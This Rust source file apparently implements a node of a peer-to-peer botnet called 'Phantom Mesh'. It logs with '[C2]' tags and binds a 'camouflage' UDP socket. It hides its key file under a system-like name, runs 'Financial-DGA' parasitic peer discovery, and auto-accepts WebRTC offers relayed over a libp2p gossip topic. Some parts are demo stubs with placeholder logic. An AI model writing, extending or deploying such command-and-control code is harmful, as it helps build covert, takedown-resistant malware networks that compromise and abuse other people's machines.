use std::time::Duration;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::sync::mpsc;
use tokio::time;
use crate::config::crypto::load_or_generate_keys;
use crate::helpers::paths::get_appdata_dir;
use crate::p2p::webrtc::WebRtcManager;
use crate::p2p::dht::RoutingTable;
use crate::p2p::signaling::{SignalingManager, SignalingCommand};
use protocol::{MeshMsg, Registration, SignalEnvelope};
use crate::logic::flooding::FloodingManager;

struct MeshState {
    dht: RoutingTable,
    webrtc: Arc<WebRtcManager>,
    signaling_tx: mpsc::Sender<SignalingCommand>,
    flooding: Arc<FloodingManager>,
    my_address: String,
    keypair: ed25519_dalek::SigningKey,
}

pub async fn start_client(_bootstrap_override: Option<String>) -> Result<(), Box<dyn std::error::Error>> {
    let key_path = get_appdata_dir().join("sys_keys.dat");
    let identity = load_or_generate_keys(key_path);

    // 1. Bind Camouflage Socket (UDP)
    let udp_socket = crate::host::network::bind_camouflage_socket().await;
    let local_port = udp_socket.local_addr()?.port();
    
    // 2. Setup WebRTC Manager
    let webrtc_manager = Arc::new(WebRtcManager::new());
    
    // 3. Setup Signaling Manager
    let libp2p_key = libp2p::identity::Keypair::generate_ed25519();
    let topic_str = "/phantom/v3/sig/global";
    
    let (mut signaling, signaling_tx, mut signaling_rx) = SignalingManager::new_with_channel(libp2p_key, topic_str, local_port)?;
    
    // 4. Setup Flooding Manager
    let flooding = Arc::new(FloodingManager::new(webrtc_manager.clone()));
    
    // Run Signaling Loop
    tokio::spawn(async move {
        signaling.run_loop().await;
    });
    
    // Process Incoming Signals (Handshake Logic)
    let webrtc_clone = webrtc_manager.clone();
    let sig_tx_clone = signaling_tx.clone();
    tokio::spawn(async move {
        while let Some((peer_id, envelope)) = signaling_rx.recv().await {
             println!("[C2] Received Signal from {}: Targets={}", peer_id, envelope.targets.len());
             
             // Simplification: Assume we are a target and decipher Payload.
             // Protocol: Payload is encrypted. 
             // Logic: Check if we are in targets.
             // For "Concept Check", we assume the payload *is* the SDP for us.
             // Real logic: Decrypt, extract SDP.
             // If payload starts with "{" (JSON SDP Offer)
             
             // Extract first target payload as "Data" for demo
             if let Some(first) = envelope.targets.first() {
                 let sdp_str = String::from_utf8_lossy(&first.encrypted_data).to_string(); // Demo mode: Plaintext
                 if sdp_str.contains("\"type\":\"offer\"") {
                     println!("[C2] Detected Offer. Accepting...");
                     match webrtc_clone.accept_connection(&sdp_str).await {
                         Ok((_pc, answer_sdp)) => {
                             // Send Answer back
                             let response = SignalEnvelope {
                                 sender_id: "me".into(),
                                 timestamp: 0,
                                 targets: vec![protocol::TargetPayload {
                                     recipient_id: peer_id.to_string(),
                                     encrypted_data: answer_sdp.into_bytes(), 
                                 }],
                             };
                             let _ = sig_tx_clone.send(SignalingCommand::PublishSignal(response)).await;
                             println!("[C2] Answer Sent.");
                         },
                         Err(e) => eprintln!("[C2] WebRTC Error: {}", e),
                     }
                 }
             }
        }
    });

    let public_ip = get_public_ip().await.unwrap_or_else(|| "127.0.0.1".to_string());
    let my_address = format!("{}:{}", public_ip, local_port);
    println!("[+] Phantom Mesh Node V3.3 Running at: {}", my_address);
    
    // State
    let state = Arc::new(RwLock::new(MeshState {
        dht: RoutingTable::new(&my_address),
        webrtc: webrtc_manager.clone(),
        signaling_tx: signaling_tx.clone(),
        flooding: flooding.clone(),
        my_address: my_address.clone(),
        keypair: identity.keypair.clone(),
    }));

    use crate::discovery::parasitic::ParasiticDiscovery;
    let discovery = ParasiticDiscovery::new();

    // Lifecycle Loop
    let state_discovery = state.clone();
    tokio::spawn(async move {
        time::sleep(Duration::from_secs(5)).await;
        loop {
            println!("[*] Running Financial-DGA Discovery Cycle...");
            match discovery.run_cycle(Some(local_port)).await {
                Ok(peers) => {
                    println!("[+] Discovered {} Potential Neighbors.", peers.len());
                    
                    // Harvest Connections: Dial 15 random peers
                    // Spec 4.2: Select 15 IP targets
                    // We assume peers (SocketAddr) are listening on TCP for Libp2p on same port?
                    // Or we just try.
                    
                    let guard = state_discovery.read().await;
                    let tx = guard.signaling_tx.clone();
                    drop(guard);
                    
                    for peer in peers.iter().take(15) {
                         let ip = peer.ip();
                         let port = peer.port();
                         // Construct Multiaddr: /ip4/x.x.x.x/tcp/yyyy
                         let ma_str = format!("/ip4/{}/tcp/{}", ip, port);
                         if let Ok(ma) = ma_str.parse::<libp2p::Multiaddr>() {
                             let _ = tx.send(SignalingCommand::Dial(ma)).await;
                         }
                    }
                },
                Err(e) => eprintln!("Discovery Error: {}", e),
            }
            time::sleep(Duration::from_secs(60)).await;
        }
    });
    
    // Keep alive
    loop {
        time::sleep(Duration::from_secs(3600)).await;
    }
}

async fn get_public_ip() -> Option<String> { Some("127.0.0.1".to_string()) }
